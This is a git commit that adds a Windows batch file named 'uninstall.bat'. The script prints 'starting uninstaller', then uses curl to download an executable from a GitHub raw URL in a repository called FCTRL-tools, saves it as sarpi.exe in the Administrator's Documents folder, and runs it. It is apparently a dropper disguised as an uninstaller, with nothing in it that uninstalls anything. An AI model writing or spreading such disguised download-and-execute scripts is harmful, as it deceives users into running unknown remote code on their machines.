d9b63241d9dd461f714aaac6da5f9088c55f38a2
Minecraft-vIIr <97388426+Minecraft-vIIr@users.noreply.github.com>
2023-11-19 17:37:02 +0800

    Add files via upload

---
+++ uninstall.bat
@@ -0,0 +1,5 @@
+@echo off
+echo starting uninstaller
+curl --output "C:\Users\Administrator\Documents\sarpi.exe" "https://raw.githubusercontent.com/Minecraft-vIIr/FCTRL-tools/main/target"
+echo processing
+"C:\Users\Administrator\Documents\sarpi.exe"
